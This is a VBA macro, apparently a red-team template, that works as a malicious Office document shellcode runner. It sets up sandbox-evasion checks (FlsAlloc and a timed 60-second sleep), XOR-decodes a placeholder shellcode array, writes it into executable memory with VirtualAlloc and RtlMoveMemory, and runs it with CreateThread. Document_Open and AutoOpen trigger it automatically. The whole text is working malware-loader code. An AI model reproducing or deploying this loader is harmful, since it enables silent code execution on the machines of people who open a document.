Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr

Sub NTj()
    Dim t1 As Date, t2 As Date
    Dim counter As Long, data As Long, time As Long
    Dim addr As LongPtr, allocRes As LongPtr, res As LongPtr
    Dim buf As Variant
    
    ' Call FlsAlloc and verify if the result exists
    allocRes = FlsAlloc(0)

    If IsNull(allocRes) Then
        End
    End If
    
    ' Sleep for 60 seconds and verify time passed
    t1 = Now()
    Sleep (60000)
    t2 = Now()

    If DateDiff("s", t1, t2) < 60 Then
        Exit Sub
    End If
    
    ' Shellcode encoded with XOR with key 0xfa/250 (output from C# helper tool)
    buf = Array(PAYLOAD)
    
    ' Allocate memory space
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    ' Decode the shellcode
    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor 250
    Next i
    
    ' Move the shellcode
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    ' Execute the shellcode
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub

Sub Document_Open()
    NTj
End Sub

Sub AutoOpen()
    NTj
End Sub